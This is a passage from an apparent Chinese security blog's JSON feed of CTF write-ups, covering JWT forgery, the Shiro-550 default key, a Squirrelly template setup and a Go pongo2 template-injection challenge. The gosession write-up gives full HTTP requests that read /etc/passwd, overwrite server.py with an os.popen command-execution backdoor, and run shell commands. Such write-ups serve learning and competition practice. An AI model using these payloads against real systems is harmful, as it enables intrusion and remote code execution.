digest=8ae52974e81aace9837123a520cb8179\n\n\n\n\n\n\n\n\n\n$username和$password\n就为admin和root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00Jay\n然后修改请求包内容\n\n得到sercret_key为sk-he00lctf3r\n然后修改jwt，进行jwt伪造\n\n然后修改网站的token\n刷新后，网站跳转http://140.210.223.216:55557/admiiiiiiiiiiin/，\n网站的名字就叫do you know struct2?\n\n确定这里是需要利用s2漏洞\n抓包查看这个网页提交请求包\n\n发现是发向/admiiiiiiiiiiin/user.action\n直接用工具也可以\nflag在环境变量里，执行env可以看到\n\nburp发包也可以，只是需要将s2的payload进行url编码即可\n\n\nps.jwt-cracker【非预期无法解】本来是想用jwt-cracker进行爆破jwt的secret\ndocker pull epsilon95/jwtcrack\n\ndocker run -it --rm jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoyMDA2MzkzMjk3fQ.bQxqRhEOZkHV3NweYcdVKO_0WKrSDIb4ExcB-9UZRk0\n\n结果CPU跑飞了也没爆破出来，看来是不是非预期能解出来，只能考虑hash长度拓展攻击\n\n脚本利用rockyou爆破salt【不知道是不是预期可行】\n在rockyou.txt中有这个key，说明可以利用这个方法进行爆破，写个脚本即可进行\n过滤rockyou中长度为14的字符，然后加到\nadminroot前进行MD5计算使得计算后的值为\ne6ccbf12de9d33ec27a5bcfb6a3293df\n&#x3D;&gt;\n最后我们就可以爆破出salt为sk-he00lctf3r\n最后只要密码随便修改为root1即可，然后再MD5计算一次得到cookie值\n","slug":"2023(星)CTF","date":"2023-07-30T12:49:04.825Z","categories_index":"网络安全学习","tags_index":"Game","author_index":"Ttoc"},{"id":"5abffa5265ef71790df12abfc2dd6b2a","title":"Apache shiro-550反序列化漏洞分析","content":"很重要，经典\n\n\nApache shiro-550反序列化漏洞分析前言\n\n\n\n\n\n\n\n\n中间件介绍：\n\nApache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理\n漏洞介绍：\n\n\n\n\n\n\n\n\n\nApacheShiro RememberMe 反序列化导致的命令执行漏洞\n\n环境搭建\n\n\n\n\n\n\n\n\n编辑器：IDEA 2022\njava版本：jdk1.7.0_80\nServer版本 : Tomcat 8.5.56\nshiro版本：shiro-root-1.2.4\n组件：commons-collections4\n下载jdk-7u80\n\n\n\n\n\n\n\n\n\nhttps://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#jdk-7u80-oth-JPR\n下载apache shiro 1.2.4\n\n\n\n\n\n\n\n\n\nhttps://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4\n下载tomcat-8 v8.5.76\n\n\n\n\n\n\n\n\n\nhttps://archive.apache.org/dist/tomcat/tomcat-8/v8.5.76/\n\n配置调试端口\n\n但是运行时报错\n\n搜索查找发现是少了两个jar包\n【直接官网找或者搜索网盘啥的，小心🐎就行】\n\n\n\n\n\n\n\n\n\njstl.jar \nstandard.jar\n先将这两个导入依赖\n\n然后放在tomcat服务器文件目录底下的lib目录下\n\n成功加载 \n\n登录页面也成功显示\n\n搭建完毕!\n漏洞原理\n\n\n\n\n\n\n\n\nApache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过序列化，AES加密，然后base64编码的cookie。\n在服务端对 rememberMe 的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。 \n那么，Payload产生的过程：\n命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值 \n在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了，Payload构造起来也是十分\n的简单。\n漏洞分析\n\n\n\n\n\n\n\n\n\n过在 cookie 的 rememberMe 字段中插⼊恶意 payload \n触发 shiro 框架的 rememberMe 的反序列化功能，导致任意代码执⾏。 \nshiro 1.2.24 中，提供了硬编码的 AES 密钥： kPH+bIxk5D2deZiIxcaaaA== \n由于**开发人员未修改AES密钥而直接使用Shiro框架**，导致了该问题\n\n\nprivate static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\");\n\n\n\n\n\n\n\n代码分析漏洞利用&amp;poc分析","slug":"Apache_shiro-550反序列化漏洞分析","date":"2023-07-21T13:40:36.963Z","categories_index":"Java","tags_index":"Java","author_index":"Ttoc"},{"id":"7f59ed435de527de8496945b09a06586","title":"2023CISCN华南","content":"2023国赛华南赛区题目学习\n\n\nOwnSquirrelly\n\n\n\n\n\n\n\n\nSquirrelly 是一个用 JavaScript 实现的现代、可配置且速度极快的模板引擎。它与 ExpressJS 一起开箱即用，完整版的 gzip 压缩后仅重约 4KB。\napp.js，发现题目是nodejs编写的网站服务，端口3000\nvar createError = require(var createError = require(&#x27;http-errors&#x27;);\nvar express = require(&#x27;express&#x27;);\nvar session = require(&#x27;express-session&#x27;);\nconst squirrelly = require(&#x27;squirrelly&#x27;)\nvar randomize = require(&#x27;randomatic&#x27;);\nvar path = require(&#x27;path&#x27;);\nvar cookieParser = require(&#x27;cookie-parser&#x27;);\nvar logger = require(&#x27;morgan&#x27;);\nvar utils = require(&#x27;./utils&#x27;);\n\nvar indexRouter = require(&#x27;./routes/index&#x27;);\nvar usersRouter = require(&#x27;./routes/users&#x27;);\n\nvar app = express();\n\n// view engine setup\napp.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));\napp.set(&#x27;view engine&#x27;, &#x27;squirrelly&#x27;);\n\napp.use(logger(&#x27;dev&#x27;));\napp.use(express.json());\napp.use(express.urlencoded(&#123; extended: true &#125;));\napp.use(cookieParser());\napp.use(express.static(path.join(__dirname, &#x27;public&#x27;)));\n\n// start session\napp.use(session(&#123;\n  name: &#x27;thejs.session&#x27;,\n  secret: randomize(&#x27;Ye0h&#x27;, 16),\n//randomize的第一个参数是生成的字符串的长度，第二个参数是生成的字符串的字符范围\n//randomize的作用是生成一个随机的字符串，用于加密session\n  resave: true,\n  saveUninitialized: true\n&#125;))\n\napp.use(&#x27;/&#x27;, indexRouter);\napp.use(&#x27;/users&#x27;, usersRouter);\n\n// catch 404 and forward to error handler\napp.use(function(req, res, next) &#123;\n  next(createError(404));\n&#125;);\n\nvar server = app.listen(3000, function () &#123;\n\n  var host = server.address().address\n  var port = server.address().port\n\n  console.log(\"Listening on http://%s:%s\", host, port)\n&#125;);\n\n\n访问，发现是一个login页面\n\n点击登录，跳转到Register页面\n\n但是注册报错，看看users.js\n// init database\nvar connection  = mysql.createConnection(&#123;\n  host:&#x27;localhost&#x27;,\n  user:&#x27;root&#x27;,\n  password:&#x27;123456&#x27;,\n  database:&#x27;ctf&#x27;\n&#125;);\n\n发现有个初始化数据库，再看看列名和数据表名\nif(req.method == if(req.method == \"POST\") &#123;\n    var username = req.body.username;\n    var password = req.body.password;\n\n    if (username !== undefined && password !== undefined) &#123;\n      var querySql = \"select * from users where username = ?\";\n      connection.query(querySql, [username], function(err, result) &#123;\n        if(err) &#123;\n          return res.render(&#x27;register&#x27;, &#123; \n            message: &#x27;Error!&#x27;\n          &#125;);\n        &#125;\n\n        result = JSON.parse(JSON.stringify(result))[0];\n\n        if(result && result.username !== undefined) &#123;\n          return res.render(&#x27;register&#x27;, &#123; \n            message: &#x27;User already exists.&#x27; \n          &#125;);\n        &#125;else &#123;\n          var insertSql = \"insert into users (`username`, `password`) value (?, ?)\";\n          connection.query(insertSql, [username, utils.md5(password)], function(err, result) &#123;\n            if(err) &#123;\n              return res.render(&#x27;register&#x27;, &#123; \n                message: &#x27;Error!&#x27; \n              &#125;);\n            &#125;\n          return res.render(&#x27;register&#x27;, &#123; \n            message: &#x27;Register successed.&#x27; \n          &#125;);\n          &#125;);\n        &#125;\n      &#125;);\n    &#125;\n  &#125;\n&#125;);\n\n于是构建该数据库和对应表和列\nCREATE database ctf;\nuse ctf;\nCREATE TABLE users (\n  id INT NOT NULL AUTO_INCREMENT,\n  username VARCHAR(50) NOT NULL,\n  password VARCHAR(255) NOT NULL,\n  PRIMARY KEY (id)\n);\n\n\n注册成功，进行登录\n\n\n查看代码，分析题目，发现是Squirrel是一个模板引擎，所以猜测改代码中存在ssti，或者XSS，或者RCE\n但是考虑到比赛不出网，所以先自己寻找注入点\n下面是两篇参考文章，\n\n\n\n\n\n\n\n\n\nNVD - CVE-2021-32819 (nist.gov)\n漏洞分析：CVE-2021-32819 - FreeBuf网络安全行业门户\n因为是js，所以查看res.render存在的地方，寻找可以控制的参数\n发现\n/* GET users listing. */\nrouter.get(&#x27;/&#x27;, function(req, res, next) &#123;\n  if (req.session.userID === undefined || req.session.userID === null) &#123;\n    return res.redirect(&#x27;/users/login&#x27;);\n  &#125;\n\n  if (!utils.isSafeObj(req.query.information))\n  &#123;\n    return res.render(&#x27;home&#x27;, &#123; username: req.session.userID &#125;);\n  &#125; else &#123;\n    return res.render(&#x27;home&#x27;, req.query.information)\n      //这里的req.query.information是一个对象，所以可以直接传入\n      //模板是home.squirrelly\n  &#125;\n&#125;);\n\n最后一行中，req.query.information是可控的，而且是将其直接进行渲染，所以这里尝试修改GET发送information参数进行ssti注入\nreturn res.render(&#x27;home&#x27;, req.query.return res.render(&#x27;home&#x27;, req.query.information)\n\n而渲染模板home，就是home.squirrelly，是squirrel特有的模板文件格式\n&lt;&lt;body>\n  div class=\"container\">\n    div class=\"home-content\">\n      img src=\"/images/avatar.jpg\" alt=\"Avatar\" class=\"avatar\">\n      h2 class=\"username\">&#123;&#123; it.username &#125;&#125;h2>\n      p class=\"timestamp\">Current Time: span id=\"current-time\">span>p>\n    div>\n  div>\n\n  script>\n    // Update current time\n    function updateCurrentTime() &#123;\n      var currentTime = new Date().toLocaleString();\n      document.getElementById(&#x27;current-time&#x27;).textContent = currentTime;\n    &#125;\n\n    // Update current time every second\n    setInterval(updateCurrentTime, 1000);\n  script>\nbody>\n\n&#123;&#123; it.username &#125;&#125;，这里就是下面代码传入的动态渲染参数，是登录后显示\nif (!utils.isSafeObj(req.query.if (!utils.isSafeObj(req.query.information))\n  &#123;\n    return res.render(&#x27;home&#x27;, &#123; username: req.session.userID &#125;);\n  &#125; else &#123;\n    return res.render(&#x27;home&#x27;, req.query.information)\n  &#125;\n\n\n\n","slug":"2023CISCN华南","date":"2023-07-01T13:35:20.047Z","categories_index":"网络安全学习","tags_index":"Game","author_index":"Ttoc"},{"id":"3a008563d9e95b96508de8510cfa8652","title":"2023CISCN初赛","content":"2023国赛web记录，学到很多，感觉原题也挺多，但是改的挺好\n\n\ngosession\n\n\n\n\n\n\n\n\n题目内容：ctfer按照官方文档的模板编写了代码，但是好像哪里出了问题。\n附件两个文件，一个route.go，一个main.go\nmain.go\npackage main\n\nimport (\n\t\"github.com/gin-gonic/gin\"\n\t\"main/route\"\n)\n\nfunc main() &#123;\n\tr := gin.Default()\n\tr.GET(\"/\", route.Index)\n\tr.GET(\"/admin\", route.Admin)\n\tr.GET(\"/flask\", route.Flask)\n\tr.Run(\"0.0.0.0:80\")\n&#125;\n\n\n这里看到三个路由\nfunc mainfunc main() &#123;\n\tr := gin.Default()\n\tr.GET(\"/\", route.Index)\n\tr.GET(\"/admin\", route.Admin)\n\tr.GET(\"/flask\", route.Flask)\n\tr.Run(\"0.0.0.0:80\")\n&#125;\n\n\n\n\n\n\n\n\n\n\n/\n/admin\n/flask\nroute.gopackage route\n\nimport (\n   \"github.com/flosch/pongo2/v6\"\n   \"github.com/gin-gonic/gin\"\n   \"github.com/gorilla/sessions\"\n   \"html\"\n   \"io\"\n   \"net/http\"\n   \"os\"\n)\n\nvar store = sessions.NewCookieStore([]byte(os.Getenv(\"SESSION_KEY\")))\n\nfunc Index(c *gin.Context) &#123;\n   session, err := store.Get(c.Request, \"session-name\")\n   if err != nil &#123;\n      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n      return\n   &#125;\n   if session.Values[\"name\"] == nil &#123;\n      session.Values[\"name\"] = \"guest\"\n      err = session.Save(c.Request, c.Writer)\n      if err != nil &#123;\n         http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n         return\n      &#125;\n   &#125;\n\n   c.String(200, \"Hello, guest\")\n&#125;\n\nfunc Admin(c *gin.Context) &#123;\n   session, err := store.Get(c.Request, \"session-name\")\n   if err != nil &#123;\n      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n      return\n   &#125;\n   if session.Values[\"name\"] != \"admin\" &#123;\n      http.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n      return\n   &#125;\n   name := c.DefaultQuery(\"name\", \"ssti\")\n   xssWaf := html.EscapeString(name)\n   tpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\")\n   if err != nil &#123;\n      panic(err)\n   &#125;\n   out, err := tpl.Execute(pongo2.Context&#123;\"c\": c&#125;)\n   if err != nil &#123;\n      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n      return\n   &#125;\n   c.String(200, out)\n&#125;\n\nfunc Flask(c *gin.Context) &#123;\n   session, err := store.Get(c.Request, \"session-name\")\n   if err != nil &#123;\n      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n      return\n   &#125;\n   if session.Values[\"name\"] == nil &#123;\n      if err != nil &#123;\n         http.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n         return\n      &#125;\n   &#125;\n   resp, err := http.Get(\"http://127.0.0.1:5000/\" + c.DefaultQuery(\"name\", \"guest\"))\n   if err != nil &#123;\n      return\n   &#125;\n   defer resp.Body.Close()\n   body, _ := io.ReadAll(resp.Body)\n\n   c.String(200, string(body))\n&#125;\n\n先看看route.php中对每个路由代码，分析写在注释\nIndex//定义了一个store的全局变量，用于存储session，session生成用到环境变量SESSION_KEY\n//os.Getenv是获取环境变量的函数\nvar store = sessions.NewCookieStore([]byte(os.Getenv(\"SESSION_KEY\")))\n\nfunc Index(c *gin.Context) &#123;\n    //store.Get()从HTTP请求c.Request中读取session-name\n   session, err := store.Get(c.Request, \"session-name\")\n    //如果获取session-name的过程中出现错误，该错误将会被赋值给变量err，并响应码500\n   if err != nil &#123;\n      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n      return\n   &#125;\n   //如果接收的session会话中没有name属性，就会给name赋值guest\n   if session.Values[\"name\"] == nil &#123;\n      session.Values[\"name\"] = \"guest\"\n      err = session.Save(c.Request, c.Writer)\n      if err != nil &#123;\n         http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n         return\n      &#125;\n   &#125;\n   //响应码200，打印 Hello, guest\n   c.String(200, \"Hello, guest\")\n&#125;\n\nAdminfunc Adminfunc Admin(c *gin.Context) &#123;\n    //  同Index\n   session, err := store.Get(c.Request, \"session-name\")\n   if err != nil &#123;\n      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n      return\n   &#125;\n    \n    //  检查session中name是否是admin，若不是，返回服务器异常500，并且显示NO\n   if session.Values[\"name\"] != \"admin\" &#123;\n      http.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n      return\n   &#125;\n    \n    //  查询c中参数name，若不存在默认参数ssti\n   name := c.DefaultQuery(\"name\", \"ssti\")\n    \n    //  html.EscapeString()转义  , & , &#x27; , \" 这五个html特殊字符\n   xssWaf := html.EscapeString(name)\n   \n    //使用 pongo2.FromString从字符串中创建一个pongo2模板实例，将\"Hello \" + xssWaf + \"!\"传入模板字符串tpl中\n   tpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\")\n   if err != nil &#123;\n      panic(err)\n   &#125;\n    //  Execute定义模块执行时的上下字符串，该函数会将模板中的变量替换为对应的值，并将结果作为一个字符串返回。\n    \n    //  pongo2.Context&#123;\"c\": c&#125;将参数c放在模板中，方便调用http请求中的一些数据\n    //这里相当于赋值如&#123;&#123; title &#125;&#125;，这里进行&#123;\"title\": \"welcome\"&#125;，\n    //这样动态显示页面中&#123;&#123; title &#125;&#125;就是welcome，而本段代码就是c的内容\n   out, err := tpl.Execute(pongo2.Context&#123;\"c\": c&#125;)\n   if err != nil &#123;\n      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n      return\n   &#125;\n    //  响应码200，返回打印out参数，也就是c参数\n   c.String(200, out)\n&#125;\n\nFlaskfunc Flaskfunc Flask(c *gin.Context) &#123;\n    //同上\n   session, err := store.Get(c.Request, \"session-name\")\n   if err != nil &#123;\n      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n      return\n   &#125;\n    //同上，检查有无name这个键值\n   if session.Values[\"name\"] == nil &#123;\n      if err != nil &#123;\n         http.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n         return\n      &#125;\n   &#125;\n    //以GET方式向http://127.0.0.1:5000/发送请求，请求c中若无name参数，默认值为guset\n   resp, err := http.Get(\"http://127.0.0.1:5000/\" + c.DefaultQuery(\"name\", \"guest\"))\n   if err != nil &#123;\n      return\n   &#125;\n   defer resp.Body.Close()\n    //读取响应包数据体\n   body, _ := io.ReadAll(resp.Body)\n   //响应码200，打印响应包数据\n   c.String(200, string(body))\n&#125;\n\n看到ssti，这里想到利用的就是admin和flask路由\nSSTIflaskflask中，没有模板注入处，只有一个获取本地响应包数据的代码\nresp, err := http.Get(&quot;http://127.0.0.1:5000/&quot; + c.DefaultQuery(&quot;name&quot;, resp, err := http.Get(&quot;http://127.0.0.1:5000/&quot; + c.DefaultQuery(&quot;name&quot;, \"guest\"))\n\tif err != nil &#123;\n\t\treturn\n\t&#125;\n\n看到是发起本地请求，获取响应\n想到的就是能不能读取到本地一些文件的数据\n它会读取http请求中name参数，并加到http://127.0.0.1:5000/后面\n所以构造类似\n\n\n\n\n\n\n\n\n\nurl&#x2F;flask?name&#x3D;xx\n但是开始没啥思路，但是看到启动main.go时发现是启动默认打开debug模式，debug模式就会将一些代码内容也显示出来，而不是简单的400\n\n所以猜想能不能利用flask下发送错误请求，导致代码报错\n于是构造\n\n\n\n\n\n\n\n\n\nurl&#x2F;flask?name&#x3D;&#x2F;\n\n这里得到/app/server.py\napp = Flask(__name__)\n \n@app.route(&#x27;/&#x27;)\ndef index():\n    name = request.args[&#x27;name&#x27;]\n    return name + \" no ssti\"\n \n \nif __name__ == \"__main__\":\n    app.run(host=\"127.0.0.1\", port=5000, debug=True)\n\n可以看到确实是打开debug\n在底下还可以看到\n\n但是并不知道PIN码是多少，所以也不能利用这个地方实现交互式shell，本来想看看PIN码能不能利用SSTI读取成功，但是SSTI也不轻松，解决了SSTI题目应该也就已经解出了\nadmin但是admin中，需要session中name参数为admin\nif session.Values[&quot;name&quot;] != if session.Values[&quot;name&quot;] != \"admin\" &#123;\n    http.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n    return\n &#125;\n\n而session生成需要环境变量SESSION_KEY，而这个根本不知道\nsession的生成在index中，尝试修改本地index中的代码\nif session.Values[&quot;name&quot;] == if session.Values[&quot;name&quot;] == nil &#123;\n   //session.Values[\"name\"] = \"guest\"，修改guest为admin\n   session.Values[\"name\"] = \"admin\"\n   err = session.Save(c.Request, c.Writer)\n\n这样就会将session中的name设为admin\n但是本地这里SESSION_KEY为空，本地运行代码后获得的session-name\n我试了一下，发现把其代入题目中也可以，所以题目环境中SESSION_KEY也是空\n\n\n\n\n\n\n\n\n\n\nMTY4NjgxODM4NHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzwtTk7ay4mTCPFS8SyBfs6-bFy8R09M_ne8m4QhPXjxQ&#x3D;&#x3D;\n再根据代码中模板注入点\nname := c.DefaultQuery(&quot;name&quot;, name := c.DefaultQuery(&quot;name&quot;, \"ssti\")\nxssWaf := html.EscapeString(name)\ntpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\")\nif err != nil &#123;\n\tpanic(err)\n&#125;\nout, err := tpl.Execute(pongo2.Context&#123;\"c\": c&#125;)\n\n会将name参数进行符合转义后，传入pongo2模板引擎中进行渲染，可以简单构造一下\n\n发现确实是可以的，但是html.EscapeString(name)把大部分字符都转义了，所以进行ssti也不容易\n去了解一下Pongo2，发现Pongo2 库是一个受 Django 模板引擎启发的 Go 模板引擎。\n所以能在Django进行的注入，在Pongo2上有极大可能执行成功\nPongo2在pongo2 package - github.com&#x2F;flosch&#x2F;pongo2 - Go Packages这里查看，发现有其和Django 1.7相似的地方\n\n就先看看Django 1.7的标签\nBuilt-in template tags and filters — Django 1.7.11 documentation\n主要看三个，也就是ssti常见的rce，uploadfile，includefile\nincludeBuilt-in template tags and filters — Django 1.7.11 documentation\n\n\n\n\n\n\n\n\n\n\n发现可以进行\n&#123;%include \"foo/bar.html\" %&#125;来包含某个文件，但是因为代码中对单双引号进行转义，所以只能包含变量，所以要构造一个可控变量\n而代码中发现，在各个函数中只有一个变量可以控制，就是c，而c的定义是c *gin.Contex\n所以查看gin文档中，c应该如何控制，实现传参\ngin-gonic&#x2F;gin#Contextgin package - github.com&#x2F;gin-gonic&#x2F;gin - Go Packages\n发现Context是一个结构体\n\n有一个http请求包数据的指针，可以获得其内容\n查看这个request中内容，\ntype Request type Request struct &#123;\n\tMethod string\n\n\tURL *url.URL\n\n\tProto      string // \"HTTP/1.0\"\n\tProtoMajor int    // 1\n\tProtoMinor int    // 0\n\n\tHeader Header\n\n\tBody io.ReadCloser\n\n\tGetBody func() (io.ReadCloser, error)\n\n\tContentLength int64\n\n\tTransferEncoding []string\n\n\tClose bool\n\n\tHost string\n\n\tForm url.Values\n\n\tPostForm url.Values\n\n\tMultipartForm *multipart.Form\n\n\tTrailer Header\n\n\tRemoteAddr string\n\n\tRequestURI string\n\n\tTLS *tls.ConnectionState\n\n\tCancel chan struct&#123;&#125;\n\n\tResponse *Response\n\t\n&#125;\n\n找寻其中可控参数\n\n\n\n\n\n\n\n\n\n发现有\nURL Header Host\nSaveUploadedFile\n需要传两个参数，文件（form表单中name的参数）和文件具体位置（path&#x2F;文件名）\n读文件x开始看马✌发的可以进行读取文件这个\nGET /admin?A&name=&#123;%25include%20c.Request.Header[c.Request.URL.RawQuery|truncatechars:1]|join%25&#125; HTTP/1.1\nHost: xxx\nA: /etc/passwd\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: session-name=MTY4NjgxODM4NHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzwtTk7ay4mTCPFS8SyBfs6-bFy8R09M_ne8m4QhPXjxQ==\nConnection: close\n\n\n\n\n\n\n\n\n\n\n\n&#123;%include c.Request.Header[c.Request.URL.RawQuery|truncatechars:1]|join%&#125;\n%需要进行url编码发包才能被解析，不然读不到name参数\n&#123;%include %&#125;\n\n进行包含文件\nc\n\n\n\n\n\n\n\n\n\n在附件go代码中可以看到c *gin.Context表示一个 Gin 框架处理 HTTP 请求的上下文对象，它包含了 HTTP 请求和响应的所有信息，所以c就是一个HTTP请求和响应集合对象\nc.Request.Header\n\n\n\n\n\n\n\n\n\n是只读取请求头内容，也就是xx: xxx [如，Accept-Encoding: gzip, deflate]\nc.Request.URL.RawQuery\n\n\n\n\n\n\n\n\n\n读取URL头中的参数值\ntruncatechars:1\n\n\n\n\n\n\n\n\n\ntruncatechars是 Flask 模板引擎中的过滤器，它的作用是截断字符串并返回指定长度的子字符串。在这个过滤器中，:1 表示要截断的长度为 1。[如上文中请求行所示，url中第一个就是A参数]\njoin\n\n\n\n\n\n\n\n\n\n将获取到的值拼接成一个字符串并返回。\n\n我就一直在读文件，想去读取machine_id和mac地址然后得到PIN码，利用debug进行交互shell执行命令\n\n\n\n但是后面看到浪✌和几位✌说的，似乎并不可行\n因为pin rce是需要设置cookie头的，而且pin rce也没法crlf，所以靠ssti读文件也没法继续进行\n写文件√所以就想办法尝试写文件，但是不清楚网站目录以及运行文件\n可是根据之前debug得到的server.py文件，这是网站运行的py文件，在/app/server.py中\n尝试上传覆盖，但是由于是GET读取参数，所以在GET提交中，添加上传文件表单，将server.py中修改，增加解析name参数，实现命令执行并显示执行内容\n\n\n\n\n\n\n\n\n\nGET请求也可以提交表单上传文件\n根据debug代码修改得到\napp = Flask(__name__)\n \n@app.route(&#x27;/&#x27;)\ndef index():\n    name = request.args[&#x27;name&#x27;]\n    res = os.popen(name).read()\n    return res + \" no ssti\"\n \n \nif __name__ == \"__main__\":\n    app.run(host=\"127.0.0.1\", port=5000, debug=True)\n\n于是构造GET请求行，进行文件上传覆盖\n/admin?name=&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&m=file&n=/app/server.py\n\n解析一下payload，首先先要去官方文档查看c *Context的方法发现有个上传文件的方法SaveUploadedFile\n\n\n\n\n\n\n\n\n\n&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py\n&#123;% set %&#125;\n\n进行设置参数值\nc.Query()\n\n\n\n\n\n\n\n\n\n是获取url中参数\n(c.HandlerName|first)   \n\n\n\n\n\n\n\n\n\nc.HandlerName是获取当前的url  \nfirst是指定获取url中的第一个参数，即m参数值file\nlast是获取url中最后一个参数，即n参数值/app/server.py\nform path\n\n\n\n\n\n\n\n\n\n就是读取url参数，进行赋值\n于是\nform=file\npath=/app/server.py\n&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;\n\n\n\n\n\n\n\n\n\n将上传的文件保存到指定的路径中。其中 file 参数表示要保存的文件，path 参数表示要保存到的路径。\n\n改包发送\nGET /admin?name=%7B%25set%20form%3Dc.Query(c.HandlerName%7Cfirst)%25%7D%7B%25set%20path%3Dc.Query(c.HandlerName%7Clast)%25%7D%7B%25set%20file%3Dc.FormFile(form)%25%7D%7B%7Bc.SaveUploadedFile(file%2Cpath)%7D%7D&m=file&n=/app/server.py HTTP/1.1\nHost: 47.92.233.116:12345\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryqwT9VdDXSgZPm0yn\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: session-name=MTY4NjgxODM4NHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzwtTk7ay4mTCPFS8SyBfs6-bFy8R09M_ne8m4QhPXjxQ==\nConnection: close\nContent-Length: 562\n\n------WebKitFormBoundaryqwT9VdDXSgZPm0yn\nContent-Disposition: form-data; name=\"file\"; filename=\"server.py\"\nContent-Type: image/jpeg\n\nfrom flask import Flask, request\nimport os\napp = Flask(__name__)\n\n@app.route(&#x27;/&#x27;)\ndef index():\n    name = request.args[&#x27;name&#x27;]\n    res = os.popen(name).read()\n    return res + \" no ssti\"\n\n\nif __name__ == \"__main__\":\n    app.run(host=\"127.0.0.1\", port=5000, debug=True)\n\n------WebKitFormBoundaryqwT9VdDXSgZPm0yn\nContent-Disposition: form-data; name=\"submit\"\n\n提交\n------WebKitFormBoundaryqwT9VdDXSgZPm0yn--\n\n*注意：需要添加\n\n\n\n\n\n\n\n\n\nContent-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundaryqwT9VdDXSgZPm0yn\n添加表单文件类型，以及分界符号，这就是GET提交上传文件表单和POST请求提交不同之处\n写入文件\n\n\n\n\n\n\n\n\n\n\n&#x2F;flask?name&#x3D;?name&#x3D;ls${IFS}&#x2F;\n*同上面对flask代码的分析\n它会将name后的参数直接加到http://127.0.0.1:5000/后面，也就是`server.py`运行的端口\n所以这里直接将?name=ls$&#123;IFS&#125;/作为flask的name参数的值\n如修改后的代码知道，server.py会执行name参数中的命令，从而实现\n\n\n/flask?name=?name=cat$&#123;IFS&#125;/th1s_1s_f13g\n\n\n\n得得flag（nnd，flag名字就不能正常一点吗，不然读文件就解决了\n结束\nreading\n\n\n\n\n\n\n\n\n题目内容：\n读点什么呢？\n与蓝帽杯这道file_session题目很像奇安信攻防社区-2022蓝帽杯初赛WriteUp (butian.net)\nunzip\n\n\n\n\n\n\n\n\n题目内容：\nunzip很简单，但是同样也很危险\n几乎原题[原创]2021深育杯线上初赛官方WriteUp-CTF对抗-看雪-安全社区|安全招聘|kanxue.com\n开始上传\n\n\n页面跳转到upload.php代码分析\n代码分析以及流程\n\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\nif (finfo_file($finfo, $_FILES[\"file\"][\"tmp_name\"]) === &#x27;application/zip&#x27;)&#123;\n    exec(&#x27;cd 